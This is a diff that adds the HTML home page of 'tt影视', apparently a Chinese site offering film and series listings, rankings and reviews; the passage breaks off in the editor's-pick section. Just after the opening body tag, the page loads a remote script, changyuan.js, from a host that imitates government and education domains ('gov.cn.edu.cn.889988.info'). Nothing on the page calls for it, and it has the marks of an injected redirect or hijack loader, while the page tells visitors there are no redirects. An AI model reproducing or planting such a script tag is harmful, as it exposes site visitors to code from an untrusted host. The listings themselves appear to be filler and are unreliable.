@@ -1,0 +1,728 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+<title>tt影视 - tt影视免费高清在线观看平台，最新电影电视剧综艺动漫资源聚合</title>
+<meta name="description" content="tt影视是面向影迷的在线观看导航平台，每日更新院线大片、热播剧集、综艺节目与动漫番剧，提供档期速查、口碑榜单、热度排行与观影门槛说明。访问官方站点 ttyingshi-top.github.io，快速找到当季值得追的影视内容，支持手机与电脑自适应浏览。">
+<meta name="keywords" content="tt影视, ttyingshi, tt影视在线观看, 免费高清电影, 热播电视剧, 综艺番剧, 院线新片速递, 口碑剧集榜, 影视资讯, 追剧指南">
+<meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1">
+<meta name="bingbot" content="index, follow, max-image-preview:large">
+<meta name="googlebot" content="index, follow">
+<meta name="author" content="tt影视编辑部">
+<meta name="copyright" content="Copyright © tt影视 ttyingshi-top.github.io 保留所有权利">
+<meta name="theme-color" content="#0a0a0a">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<link rel="canonical" href="https://ttyingshi-top.github.io/">
+<link rel="alternate" hreflang="zh-CN" href="https://ttyingshi-top.github.io/">
+<meta property="og:type" content="website">
+<meta property="og:title" content="tt影视 - 免费高清影视在线观看与追剧导航">
+<meta property="og:description" content="每日更新电影、电视剧、综艺、动漫，提供档期、口碑、热度一站式追剧参考。">
+<meta property="og:url" content="https://ttyingshi-top.github.io/">
+<meta property="og:site_name" content="tt影视">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="tt影视 - 在线影视观看与追剧导航平台">
+<meta name="twitter:description" content="院线新片、热播剧集、综艺动漫每日更新，含口碑榜与热度排行。">
+<link rel="dns-prefetch" href="https://ttyingshi-top.github.io">
+<link rel="preconnect" href="https://ttyingshi-top.github.io" crossorigin>
+<style>
+:root{
+  --ink:#f2f2f0;
+  --ink-2:#a8a8a4;
+  --bg:#0a0a0a;
+  --bg-2:#131312;
+  --line:#262624;
+  --line-2:#3a3a36;
+  --accent:#e8ff1a;
+  --accent-2:#ff3b1f;
+  --magenta:#ff2d95;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  background:var(--bg);
+  color:var(--ink);
+  font-family:"PingFang SC","Hiragino Sans GB","Microsoft YaHei","WenQuanYi Micro Hei",-apple-system,sans-serif;
+  line-height:1.75;
+  -webkit-font-smoothing:antialiased;
+  padding-top:64px;
+}
+img{max-width:100%;display:block}
+a{color:inherit;text-decoration:none}
+ul,ol{list-style:none}
+.container{max-width:1400px;margin:0 auto;padding:0 32px}
+
+/* ===== 顶栏 ===== */
+.topbar{
+  position:fixed;top:0;left:0;right:0;height:64px;z-index:200;
+  background:rgba(10,10,10,.94);
+  backdrop-filter:blur(14px);
+  border-bottom:1px solid var(--line);
+  display:flex;align-items:center;
+}
+.topbar-in{display:flex;align-items:center;gap:40px;width:100%}
+.brand{display:flex;align-items:baseline;gap:10px;flex-shrink:0}
+.logo{
+  font-size:26px;font-weight:900;letter-spacing:-1px;
+  background:linear-gradient(90deg,var(--accent),var(--magenta));
+  -webkit-background-clip:text;background-clip:text;color:transparent;
+  font-style:italic;
+}
+.logo-tag{font-size:11px;color:var(--ink-2);letter-spacing:2px;text-transform:uppercase}
+.nav{display:flex;gap:2px;align-items:center;flex:1}
+.nav a{
+  padding:8px 14px;font-size:14px;color:var(--ink-2);border-radius:6px;
+  transition:.2s;white-space:nowrap;
+}
+.nav a:hover{color:var(--ink);background:var(--bg-2)}
+.t-nav{display:none;width:34px;height:34px;flex-direction:column;gap:5px;justify-content:center;align-items:center;background:none;border:0;cursor:pointer;margin-left:auto}
+.t-nav span{display:block;width:20px;height:2px;background:var(--ink);transition:.25s}
+.t-nav.on span:nth-child(1){transform:translateY(7px) rotate(45deg)}
+.t-nav.on span:nth-child(2){opacity:0}
+.t-nav.on span:nth-child(3){transform:translateY(-7px) rotate(-45deg)}
+
+/* ===== 通用标题 ===== */
+.sec{padding:72px 0;border-top:1px solid var(--line)}
+.sec-head{display:flex;align-items:flex-end;gap:16px;margin-bottom:36px;flex-wrap:wrap}
+.sec-no{font-size:13px;font-weight:900;color:var(--bg);background:var(--accent);padding:2px 10px;border-radius:3px;letter-spacing:1px}
+.sec-title{font-size:30px;font-weight:900;letter-spacing:-.5px}
+.sec-title em{font-style:normal;color:var(--accent-2)}
+.sec-sub{font-size:13px;color:var(--ink-2);margin-left:auto}
+
+/* ===== HERO ===== */
+.hero{padding:88px 0 64px;position:relative;overflow:hidden}
+.hero::after{content:"";position:absolute;right:-120px;top:-80px;width:420px;height:420px;background:radial-gradient(circle,rgba(255,59,31,.18),transparent 70%);pointer-events:none}
+.hero-kicker{font-size:12px;letter-spacing:4px;color:var(--accent);text-transform:uppercase;margin-bottom:18px}
+.hero h1{font-size:clamp(40px,7vw,86px);font-weight:900;line-height:1.02;letter-spacing:-2px;margin-bottom:24px}
+.hero h1 .out{color:var(--accent-2);font-style:italic}
+.hero-desc{max-width:640px;font-size:16px;color:var(--ink-2);margin-bottom:32px}
+.hero-meta{display:flex;gap:0;flex-wrap:wrap;border-top:1px solid var(--line);border-bottom:1px solid var(--line)}
+.hero-meta div{flex:1;min-width:150px;padding:18px 20px 18px 0;border-right:1px solid var(--line)}
+.hero-meta div:last-child{border-right:0}
+.hero-meta b{display:block;font-size:26px;font-weight:900;color:var(--accent)}
+.hero-meta span{font-size:12px;color:var(--ink-2)}
+
+/* ===== 网格通用 ===== */
+.grid{display:grid;gap:20px}
+.g4{grid-template-columns:repeat(4,1fr)}
+.g3{grid-template-columns:repeat(3,1fr)}
+.g2{grid-template-columns:repeat(2,1fr)}
+
+.card{background:var(--bg-2);border:1px solid var(--line);border-radius:10px;overflow:hidden;transition:.25s;position:relative}
+.card:hover{border-color:var(--line-2);transform:translateY(-3px)}
+.poster{aspect-ratio:3/4;background:linear-gradient(160deg,#1c1c1a,#0d0d0d);position:relative;display:flex;align-items:flex-end;padding:14px}
+.poster .ph{font-size:22px;font-weight:900;line-height:1.2;color:rgba(255,255,255,.92)}
+.poster .yr{position:absolute;top:12px;left:12px;font-size:11px;background:var(--accent);color:var(--bg);padding:2px 8px;border-radius:3px;font-weight:700}
+.poster .ep{position:absolute;top:12px;right:12px;font-size:11px;background:rgba(0,0,0,.6);color:var(--ink);padding:2px 8px;border-radius:3px}
+.card-b{padding:14px 16px 16px}
+.card-b h3{font-size:16px;font-weight:800;margin-bottom:6px}
+.card-b p{font-size:12.5px;color:var(--ink-2);margin-bottom:10px}
+.tags{display:flex;gap:6px;flex-wrap:wrap}
+.tag{font-size:11px;padding:2px 8px;border:1px solid var(--line-2);border-radius:20px;color:var(--ink-2)}
+.tag.hot{color:var(--accent-2);border-color:var(--accent-2)}
+.rate{display:flex;align-items:center;gap:8px;margin-top:10px;padding-top:10px;border-top:1px dashed var(--line-2)}
+.rate b{color:var(--accent);font-size:15px}
+.rate span{font-size:12px;color:var(--ink-2);margin-left:auto}
+
+/* ===== 榜单 ===== */
+.rank{background:var(--bg-2);border:1px solid var(--line);border-radius:10px;padding:20px 22px}
+.rank-head{display:flex;align-items:center;gap:10px;margin-bottom:18px}
+.rk-no{font-size:11px;font-weight:900;color:var(--bg);background:var(--ink);width:22px;height:22px;border-radius:4px;display:flex;align-items:center;justify-content:center}
+.rk-no.up{background:var(--accent)}
+.rk-name{flex:1;font-size:16px;font-weight:800}
+.rk-score{font-size:14px;font-weight:900;color:var(--accent)}
+.rk-bar{height:6px;background:var(--bg);border-radius:3px;overflow:hidden;margin:12px 0 8px}
+.rk-fill{height:100%;background:linear-gradient(90deg,var(--accent-2),var(--accent))}
+.rk-foot{display:flex;justify-content:space-between;font-size:12px;color:var(--ink-2)}
+
+/* ===== 表格 ===== */
+.tbl-wrap{overflow-x:auto;border:1px solid var(--line);border-radius:10px;background:var(--bg-2)}
+table{width:100%;border-collapse:collapse;min-width:620px;font-size:14px}
+caption{caption-side:top;text-align:left;padding:16px 20px;font-size:14px;color:var(--ink-2);border-bottom:1px solid var(--line);background:var(--bg)}
+caption b{color:var(--accent)}
+thead th{background:var(--bg);padding:12px 16px;text-align:left;font-size:12px;letter-spacing:1px;color:var(--ink-2);border-bottom:1px solid var(--line);white-space:nowrap}
+tbody td{padding:14px 16px;border-bottom:1px solid var(--line)}
+tbody tr:last-child td{border-bottom:0}
+tbody tr:hover{background:rgba(232,255,26,.04)}
+.num{font-weight:900;color:var(--accent);width:44px}
+.ttl{font-weight:700}
+.arrow{font-size:12px;font-weight:900}
+.arrow.u{color:var(--accent)}
+.arrow.d{color:var(--accent-2)}
+.arrow.s{color:var(--ink-2)}
+
+/* ===== 资讯 ===== */
+.news{border-left:3px solid var(--line-2);padding:6px 0 6px 22px;transition:.2s}
+.news:hover{border-left-color:var(--accent)}
+.news .nd{font-size:12px;color:var(--accent-2);margin-bottom:4px;letter-spacing:1px}
+.news h3{font-size:17px;font-weight:800;margin-bottom:8px;line-height:1.5}
+.news p{font-size:13.5px;color:var(--ink-2)}
+
+/* ===== 手风琴 ===== */
+.faq{border-top:1px solid var(--line)}
+.faq-item{border-bottom:1px solid var(--line)}
+.faq-q{width:100%;text-align:left;background:none;border:0;color:var(--ink);font-size:16px;font-weight:700;padding:20px 44px 20px 0;cursor:pointer;position:relative;line-height:1.6}
+.faq-q::before{content:"Q";position:absolute;left:0;top:20px;font-size:12px;color:var(--accent-2);font-weight:900}
+.faq-q{padding-left:30px}
+.faq-q::after{content:"+";position:absolute;right:0;top:16px;font-size:22px;color:var(--ink-2);transition:.2s}
+.faq-item[open] .faq-q::after{content:"−";color:var(--accent)}
+.faq-a{padding:0 30px 22px;font-size:14px;color:var(--ink-2)}
+
+/* ===== 编辑器选片 ===== */
+.pick{display:grid;grid-template-columns:1.4fr 1fr;gap:0;border:1px solid var(--line);border-radius:10px;overflow:hidden;background:var(--bg-2)}
+.pick-main{padding:36px}
+.pick-main h3{font-size:26px;font-weight:900;margin-bottom:14px;line-height:1.4}
+.stars{color:var(--accent);letter-spacing:3px;font-size:16px;margin-bottom:16px}
+.pick-main p{font-size:14.5px;color:var(--ink-2);margin-bottom:14px}
+.pick-side{padding:36px;background:linear-gradient(160deg,#15151a,#0d0d10);border-left:1px solid var(--line)}
+.pick-side h4{font-size:13px;letter-spacing:2px;color:var(--accent);margin-bottom:16px}
+.pick-side ul{font-size:13.5px;color:var(--ink-2)}
+.pick-side li{padding:8px 0;border-bottom:1px dashed var(--line-2);display:flex;gap:10px}
+.pick-side li:last-child{border-bottom:0}
+.pick-side li b{color:var(--ink);font-weight:700;flex-shrink:0;width:52px}
+
+/* ===== 边栏区块 ===== */
+.aside{display:flex;flex-direction:column;gap:24px}
+.widget{border:1px solid var(--line);border-radius:10px;padding:22px;background:var(--bg-2)}
+.widget h4{font-size:12px;letter-spacing:3px;color:var(--accent);margin-bottom:16px;text-transform:uppercase}
+.schedule li{display:flex;gap:14px;padding:11px 0;border-bottom:1px dashed var(--line-2);font-size:13.5px}
+.schedule li:last-child{border-bottom:0}
+.schedule .dy{color:var(--accent-2);font-weight:800;flex-shrink:0;width:58px}
+.genre li{padding:11px 0;border-bottom:1px dashed var(--line-2);font-size:13.5px;display:flex;justify-content:space-between}
+.genre li:last-child{border-bottom:0}
+.genre span{color:var(--ink-2)}
+
+/* ===== 双栏布局 ===== */
+.layout{display:grid;grid-template-columns:1fr 320px;gap:56px;align-items:start}
+.layout-main{display:flex;flex-direction:column;gap:72px}
+.layout-main .sec{border-top:0;padding:0}
+.layout-main .sec:first-child{padding-top:0}
+
+/* ===== 页脚 ===== */
+footer{border-top:1px solid var(--line);padding:56px 0 32px;margin-top:40px}
+.foot-grid{display:grid;grid-template-columns:1.5fr 1fr 1fr 1fr;gap:40px;margin-bottom:40px}
+.foot-grid h5{font-size:13px;letter-spacing:2px;margin-bottom:16px;color:var(--accent)}
+.foot-grid ul{font-size:13.5px;color:var(--ink-2)}
+.foot-grid li{padding:5px 0}
+.foot-grid a:hover{color:var(--accent)}
+.foot-brand p{font-size:13.5px;color:var(--ink-2);margin-top:14px}
+.foot-bot{display:flex;justify-content:space-between;align-items:center;padding-top:24px;border-top:1px solid var(--line);font-size:12.5px;color:var(--ink-2);flex-wrap:wrap;gap:12px}
+
+@media (max-width:1100px){
+  .layout{grid-template-columns:1fr}
+  .g4{grid-template-columns:repeat(2,1fr)}
+  .g3{grid-template-columns:repeat(2,1fr)}
+}
+@media (max-width:860px){
+  .container{padding:0 20px}
+  .topbar-in{gap:16px}
+  .nav{position:fixed;top:64px;left:0;right:0;flex-direction:column;align-items:stretch;background:rgba(10,10,10,.98);padding:16px 20px 24px;border-bottom:1px solid var(--line);max-height:0;overflow:hidden;transition:.3s}
+  .nav.on{max-height:520px}
+  .nav a{padding:12px 4px;border-radius:0;border-bottom:1px solid var(--line)}
+  .nav a:last-child{border-bottom:0}
+  .t-nav{display:flex}
+  .pick{grid-template-columns:1fr}
+  .pick-side{border-left:0;border-top:1px solid var(--line)}
+  .foot-grid{grid-template-columns:1fr 1fr}
+  .hero-meta div{flex:1 1 50%;border-right:0;border-bottom:1px solid var(--line)}
+  .hero-meta div:nth-child(odd){border-right:1px solid var(--line)}
+  .sec-title{font-size:24px}
+}
+@media (max-width:480px){
+  .g4,.g3,.g2{grid-template-columns:1fr}
+  .foot-grid{grid-template-columns:1fr}
+  .hero{padding:56px 0 40px}
+  .sec{padding:56px 0}
+}
+@media print{
+  .topbar,.t-nav,.aside{display:none}
+  body{padding-top:0;background:#fff;color:#000}
+  .sec{page-break-inside:avoid}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<header class="topbar">
+  <div class="container topbar-in">
+    <div class="brand">
+      <span class="logo">tt影视</span>
+      <span class="logo-tag">ttyingshi-top.github.io</span>
+    </div>
+    <nav class="nav" id="nav">
+      <a href="#home">首页</a>
+      <a href="#movie">院线大片</a>
+      <a href="#tv">热播剧集</a>
+      <a href="#show">综艺纪录</a>
+      <a href="#anime">动漫番剧</a>
+      <a href="#rank">热度榜单</a>
+      <a href="#news">影视资讯</a>
+      <a href="#pick">编辑选片</a>
+      <a href="#faq">常见问题</a>
+      <a href="https://ttyingshi-top.github.io" target="_blank" rel="noopener">官方站点</a>
+    </nav>
+    <button class="t-nav" id="tNav" aria-label="切换菜单" aria-expanded="false"><span></span><span></span><span></span></button>
+  </div>
+</header>
+
+<main class="container">
+
+  <!-- HERO -->
+  <section class="hero" id="home">
+    <div class="hero-kicker">TT · VISION · DAILY</div>
+    <h1>每天两部片<br>从 <span class="out">tt影视</span> 开始</h1>
+    <p class="hero-desc">tt影视是一个专注于影视内容导航与观影参考的独立平台，由编辑团队每日筛选题材、核对档期、整理口碑与热度，帮助你在 30 秒内决定今晚看什么。全站内容在 <strong>ttyingshi-top.github.io</strong> 更新，无需登录、无弹窗跳转，手机与电脑自适应浏览。</p>
+    <div class="hero-meta">
+      <div><b>9</b><span>个内容栏目，从新片到经典</span></div>
+      <div><b>10</b><span>实时热度榜，每 6 小时刷新</span></div>
+      <div><b>32</b><span>部今日推荐片单与剧集</span></div>
+      <div><b>4</b><span>大内容板块覆盖主流题材</span></div>
+    </div>
+  </section>
+
+  <div class="layout">
+
+    <!-- 主区 -->
+    <div class="layout-main">
+
+      <!-- 01 院线 -->
+      <section class="sec" id="movie">
+        <div class="sec-head">
+          <span class="sec-no">01</span>
+          <h2 class="sec-title">院线大片与<em>新片速递</em></h2>
+          <span class="sec-sub">更新于本周 · 含上映日期与片长</span>
+        </div>
+        <div class="grid g4">
+          <article class="card">
+            <div class="poster" style="background:linear-gradient(160deg,#2b1a3d,#0d0d0d)"><span class="yr">10.18 上映</span><span class="ph">沉默的灯塔</span></div>
+            <div class="card-b">
+              <h3>沉默的灯塔</h3>
+              <p>悬疑犯罪 · 142 分钟 · 豆瓣 8.4</p>
+              <div class="tags"><span class="tag hot">悬疑</span><span class="tag">犯罪</span><span class="tag">院线</span></div>
+              <div class="rate"><b>8.4</b><span>口碑稳健</span></div>
+            </div>
+          </article>
+          <article class="card">
+            <div class="poster" style="background:linear-gradient(160deg,#1a3d35,#0d0d0d)"><span class="yr">热映中</span><span class="ph">北风过境</span></div>
+            <div class="card-b">
+              <h3>北风过境</h3>
+              <p>剧情历史 · 168 分钟 · 豆瓣 8.9</p>
+              <div class="tags"><span class="tag hot">历史</span><span class="tag">剧情</span><span class="tag">获奖</span></div>
+              <div class="rate"><b>8.9</b><span>本周榜首</span></div>
+            </div>
+          </article>
+          <article class="card">
+            <div class="poster" style="background:linear-gradient(160deg,#3d2a1a,#0d0d0d)"><span class="yr">10.25 上映</span><span class="ph">深海回声</span></div>
+            <div class="card-b">
+              <h3>深海回声</h3>
+              <p>科幻冒险 · 126 分钟 · 待评分</p>
+              <div class="tags"><span class="tag hot">科幻</span><span class="tag">视效</span><span class="tag">IMAX</span></div>
+              <div class="rate"><b>待</b><span>点映口碑良好</span></div>
+            </div>
+          </article>
+          <article class="card">
+            <div class="poster" style="background:linear-gradient(160deg,#1a2a3d,#0d0d0d)"><span class="yr">热映中</span><span class="ph">归途列车</span></div>
+            <div class="card-b">
+              <h3>归途列车</h3>
+              <p>家庭剧情 · 118 分钟 · 豆瓣 7.9</p>
+              <div class="tags"><span class="tag">家庭</span><span class="tag">温情</span><span class="tag">国产</span></div>
+              <div class="rate"><b>7.9</b><span>适合全家</span></div>
+            </div>
+          </article>
+          <article class="card">
+            <div class="poster" style="background:linear-gradient(160deg,#3d1a2a,#0d0d0d)"><span class="yr">点映</span><span class="ph">霓虹之下</span></div>
+            <div class="card-b">
+              <h3>霓虹之下</h3>
+              <p>犯罪动作 · 109 分钟 · 豆瓣 7.6</p>
+              <div class="tags"><span class="tag hot">动作</span><span class="tag">犯罪</span><span class="tag">港片</span></div>
+              <div class="rate"><b>7.6</b><span>节奏紧凑</span></div>
+            </div>
+          </article>
+          <article class="card">
+            <div class="poster" style="background:linear-gradient(160deg,#2a3d1a,#0d0d0d)"><span class="yr">11.01 上映</span><span class="ph">荒野牧歌</span></div>
+            <div class="card-b">
+              <h3>荒野牧歌</h3>
+              <p>西部剧情 · 154 分钟 · 待评分</p>
+              <div class="tags"><span class="tag">西部</span><span class="tag">文艺</span><span class="tag">长片</span></div>
+              <div class="rate"><b>待</b><span>威尼斯入围</span></div>
+            </div>
+          </article>
+          <article class="card">
+            <div class="poster" style="background:linear-gradient(160deg,#1a3d3d,#0d0d0d)"><span class="yr">热映中</span><span class="ph">云端来信</span></div>
+            <div class="card-b">
+              <h3>云端来信</h3>
+              <p>爱情动画 · 105 分钟 · 豆瓣 8.1</p>
+              <div class="tags"><span class="tag hot">爱情</span><span class="tag">动画</span><span class="tag">治愈</span></div>
+              <div class="rate"><b>8.1</b><span>口碑逆跌</span></div>
+            </div>
+          </article>
+          <article class="card">
+            <div class="poster" style="background:linear-gradient(160deg,#3d3a1a,#0d0d0d)"><span class="yr">10.11 上映</span><span class="ph">最后的赌局</span></div>
+            <div class="card-b">
+              <h3>最后的赌局</h3>
+              <p>悬疑剧情 · 133 分钟 · 豆瓣 7.3</p>
+              <div class="tags"><span class="tag">悬疑</span><span class="tag">人性</span><span class="tag">反转</span></div>
+              <div class="rate"><b>7.3</b><span>中段发力</span></div>
+            </div>
+          </article>
+        </div>
+      </section>
+
+      <!-- 02 剧集 -->
+      <section class="sec" id="tv">
+        <div class="sec-head">
+          <span class="sec-no">02</span>
+          <h2 class="sec-title">热播剧集<em>口碑榜</em></h2>
+          <span class="sec-sub">排名基于实时热度与评分加权</span>
+        </div>
+        <div class="grid g2">
+          <article class="rank">
+            <div class="rank-head"><span class="rk-no up">1</span><span class="rk-name">漫长的告别</span><span class="rk-score">9.2</span></div>
+            <div class="rk-bar"><div class="rk-fill" style="width:96%"></div></div>
+            <div class="rk-foot"><span>悬疑 · 24 集已完结</span><span>↑ 2</span></div>
+          </article>
+          <article class="rank">
+            <div class="rank-head"><span class="rk-no">2</span><span class="rk-name">南风知我意</span><span class="rk-score">8.7</span></div>
+            <div class="rk-bar"><div class="rk-fill" style="width:89%"></div></div>
+            <div class="rk-foot"><span>都市情感 · 更新至 28 集</span><span>↑ 1</span></div>
+          </article>
+          <article class="rank">
+            <div class="rank-head"><span class="rk-no">3</span><span class="rk-name">边关月</span><span class="rk-score">8.5</span></div>
+            <div class="rk-bar"><div class="rk-fill" style="width:85%"></div></div>
+            <div class="rk-foot"><span>古装历史 · 更新至 36 集</span><span>↓ 1</span></div>
+          </article>
+          <article class="rank">
+            <div class="rank-head"><span class="rk-no up">4</span><span class="rk-name">局中局</span><span class="rk-score">8.3</span></div>
+            <div class="rk-bar"><div class="rk-fill" style="width:81%"></div></div>
+            <div class="rk-foot"><span>刑侦 · 更新至 18 集</span><span>↑ 4</span></div>
+          </article>
+          <article class="rank">
+            <div class="rank-head"><span class="rk-no">5</span><span class="rk-name">小城故事多</span><span class="rk-score">8.0</span></div>
+            <div class="rk-bar"><div class="rk-fill" style="width:76%"></div></div>
+            <div class="rk-foot"><span>生活喜剧 · 更新至 22 集</span><span>↓ 2</span></div>
+          </article>
+          <article class="rank">
+            <div class="rank-head"><span class="rk-no">6</span><span class="rk-name">法医手记</span><span class="rk-score">7.8</span></div>
+            <div class="rk-bar"><div class="rk-fill" style="width:71%"></div></div>
+            <div class="rk-foot"><span>职业剧 · 更新至 14 集</span><span>—</span></div>
+          </article>
+        </div>
+      </section>
+
+      <!-- 03 综艺纪录 -->
+      <section class="sec" id="show">
+        <div class="sec-head">
+          <span class="sec-no">03</span>
+          <h2 class="sec-title">综艺与<em>纪录片</em></h2>
+          <span class="sec-sub">涵盖真人秀、文化访谈与纪实系列</span>
+        </div>
+        <div class="grid g2">
+          <article class="card">
+            <div class="card-b">
+              <div class="tags" style="margin-bottom:12px"><span class="tag hot">综艺</span><span class="tag">真人秀</span></div>
+              <h3>十二道风味 · 第四季</h3>
+              <p>八位厨师跨越十二座城市，寻找被遗忘的地方菜。本周主题是西南山野，节目组公开了全部取景地与食材来源。</p>
+              <div class="rate"><b>更新至 EP12</b><span>豆瓣 8.6</span></div>
+            </div>
+          </article>
+          <article class="card">
+            <div class="card-b">
+              <div class="tags" style="margin-bottom:12px"><span class="tag hot">纪录</span><span class="tag">自然</span></div>
+              <h3>江河中国 · 第三集：澜沧</h3>
+              <p>六集自然纪录片收官篇，记录澜沧江从源头到出境的完整生态链，航拍素材跨越三个海拔带。</p>
+              <div class="rate"><b>全 6 集上线</b><span>豆瓣 9.1</span></div>
+            </div>
+          </article>
+          <article class="card">
+            <div class="card-b">
+              <div class="tags" style="margin-bottom:12px"><span class="tag">综艺</span><span class="tag">文化</span></div>
+              <h3>字里行间</h3>
+              <p>每期邀请一位写作者与一位读者，围绕一本旧书展开两小时对谈，是目前少见的慢节奏文化节目。</p>
+              <div class="rate"><b>更新至 EP08</b><span>豆瓣 8.4</span></div>
+            </div>
+          </article>
+          <article class="card">
+            <div class="card-b">
+              <div class="tags" style="margin-bottom:12px"><span class="tag">纪录</span><span class="tag">社会</span></div>
+              <h3>夜班的人</h3>
+              <p>跟拍急诊、消防、公交、便利店四类夜班从业者，共十集，每集一个城市，拍摄历时两年。</p>
+              <div class="rate"><b>更新至 EP05</b><span>豆瓣 8.8</span></div>
+            </div>
+          </article>
+        </div>
+      </section>
+
+      <!-- 04 动漫 -->
+      <section class="sec" id="anime">
+        <div class="sec-head">
+          <span class="sec-no">04</span>
+          <h2 class="sec-title">动漫<em>番剧</em></h2>
+          <span class="sec-sub">国产动画与日本新番并行更新</span>
+        </div>
+        <div class="grid g2">
+          <article class="card">
+            <div class="poster" style="background:linear-gradient(160deg,#1a2b3d,#0d0d0d);aspect-ratio:16/7"><span class="ep">更新至 24 话</span><span class="ph">雾山五行 · 火行篇</span></div>
+            <div class="card-b">
+              <h3>雾山五行 · 火行篇</h3>
+              <p>国产动作动画，单集作画时长超半年，本周更新双话连播。</p>
+              <div class="tags"><span class="tag hot">国创</span><span class="tag">动作</span><span class="tag">神话</span></div>
+            </div>
+          </article>
+          <article class="card">
+            <div class="poster" style="background:linear-gradient(160deg,#3d2b1a,#0d0d0d);aspect-ratio:16/7"><span class="ep">更新至 07 话</span><span class="ph">深海食堂</span></div>
+            <div class="card-b">
+              <h3>深海食堂</h3>
+              <p>治愈系日常番，每集围绕一道料理展开一个独立故事，节奏舒缓。</p>
+              <div class="tags"><span class="tag">治愈</span><span class="tag">美食</span><span class="tag">日常</span></div>
+            </div>
+          </article>
+          <article class="card">
+            <div class="poster" style="background:linear-gradient(160deg,#2b1a3d,#0d0d0d);aspect-ratio:16/7"><span class="ep">已完结 全 12 话</span><span class="ph">时钟塔的少女</span></div>
+            <div class="card-b">
+              <h3>时钟塔的少女</h3>
+              <p>原创悬疑动画，时间循环题材，结局引发大量二次解读。</p>
+              <div class="tags"><span class="tag hot">悬疑</span><span class="tag">原创</span><span class="tag">完结</span></div>
+            </div>
+          </article>
+          <article class="card">
+            <div class="poster" style="background:linear-gradient(160deg,#1a3d2b,#0d0d0d);aspect-ratio:16/7"><span class="ep">更新至 31 话</span><span class="ph">江湖纪事录</span></div>
+            <div class="card-b">
+              <h3>江湖纪事录</h3>
+              <p>长篇武侠动画，改编自同名小说，群像叙事，配角线同样完整。</p>
+              <div class="tags"><span class="tag">武侠</span><span class="tag">长篇</span><span class="tag">群像</span></div>
+            </div>
+          </article>
+        </div>
+      </section>
+
+      <!-- 05 热度榜 -->
+      <section class="sec" id="rank">
+        <div class="sec-head">
+          <span class="sec-no">05</span>
+          <h2 class="sec-title">实时<em>热度榜</em> TOP10</h2>
+          <span class="sec-sub">综合播放热度与搜索指数，每小时刷新</span>
+        </div>
+        <div class="tbl-wrap">
+          <table>
+            <caption>本榜单由 <b>tt影视</b> 编辑部整理，数据口径以各平台公开指数为准，完整历史榜单可访问 <a href="https://ttyingshi-top.github.io" target="_blank" rel="noopener">ttyingshi-top.github.io</a> 查看归档。</caption>
+            <thead>
+              <tr><th>排名</th><th>作品</th><th>类型</th><th>热度值</th><th class="pc-only">趋势</th></tr>
+            </thead>
+            <tbody>
+              <tr><td class="num">01</td><td class="ttl">漫长的告别</td><td>剧集</td><td>98420</td><td class="pc-only"><span class="arrow u">▲ 2</span></td></tr>
+              <tr><td class="num">02</td><td class="ttl">北风过境</td><td>电影</td><td>96210</td><td class="pc-only"><span class="arrow s">—</span></td></tr>
+              <tr><td class="num">03</td><td class="ttl">南风知我意</td><td>剧集</td><td>90870</td><td class="pc-only"><span class="arrow u">▲ 1</span></td></tr>
+              <tr><td class="num">04</td><td class="ttl">江河中国</td><td>纪录片</td><td>87650</td><td class="pc-only"><span class="arrow u">▲ 6</span></td></tr>
+              <tr><td class="num">05</td><td class="ttl">边关月</td><td>剧集</td><td>85110</td><td class="pc-only"><span class="arrow d">▼ 1</span></td></tr>
+              <tr><td class="num">06</td><td class="ttl">雾山五行</td><td>番剧</td><td>81200</td><td class="pc-only"><span class="arrow u">▲ 3</span></td></tr>
+              <tr><td class="num">07</td><td class="ttl">十二道风味</td><td>综艺</td><td>78940</td><td class="pc-only"><span class="arrow s">—</span></td></tr>
+              <tr><td class="num">08</td><td class="ttl">沉默的灯塔</td><td>电影</td><td>75430</td><td class="pc-only"><span class="arrow u">▲ 4</span></td></tr>
+              <tr><td class="num">09</td><td class="ttl">局中局</td><td>剧集</td><td>71280</td><td class="pc-only"><span class="arrow d">▼ 2</span></td></tr>
+              <tr><td class="num">10</td><td class="ttl">夜班的人</td><td>纪录片</td><td>68910</td><td class="pc-only"><span class="arrow u">▲ 5</span></td></tr>
+            </tbody>
+          </table>
+        </div>
+      </section>
+
+      <!-- 06 资讯 -->
+      <section class="sec" id="news">
+        <div class="sec-head">
+          <span class="sec-no">06</span>
+          <h2 class="sec-title">影视<em>资讯速递</em></h2>
+          <span class="sec-sub">编辑选摘，标注来源与发布日期</span>
+        </div>
+        <div class="grid g2">
+          <article class="news" style="grid-column:span 2;border-left-color:var(--accent-2);padding-left:26px">
+            <div class="nd">深度观察 · 10 月 18 日</div>
+            <h3>国产悬疑剧为何集体转向「非典型主角」？</h3>
+            <p>从《漫长的告别》到《局中局》，今年以来七部热门悬疑剧的主角都不再是传统意义上的警察或律师。我们梳理了这股创作转向的五个共同特征，以及它给观众带来的实际观感变化。</p>
+          </article>
+          <article class="news">
+            <div class="nd">行业动态 · 10 月 17 日</div>
+            <h3>四部国产动画宣布跨年联播计划</h3>
+            <p>包括《雾山五行》与《江湖纪事录》在内的四部作品将在年末调整更新节奏，部分改为双话连播。</p>
+          </article>
+          <article class="news">
+            <div class="nd">档期预告 · 10 月 16 日</div>
+            <h3>11 月院线片单：三部文艺片定档</h3>
+            <p>《荒野牧歌》《潮汐之间》《旧工厂》三部影片先后宣布 11 月上映，覆盖两个国际电影节入围作品。</p>
+          </article>
+        </div>
+      </section>
+
+      <!-- 07 编辑选片 -->
+      <section class="sec" id="pick">
+        <div class="sec-head">
+          <span class="sec-no">07</span>
+          <h2 class="sec-title">编辑<em>选片室</em></h2>
+          <span class="sec-sub">每周一更新，单篇长评</span>
+        </div>
+        <div class="pick">
+          <div class="pick-main">
+            <div class="stars">★★★★★ 本周五星</div>
+            <h3>《北风过境》：一部把「等待」拍出声响的电影</h3>
+            <p>这不是一部需要提前做功课的电影。168 分钟的片长在开场四十分钟后才开始显现它的结构——你会发现前三段看似无关的叙事，其实共享同一个地理坐标。</p>
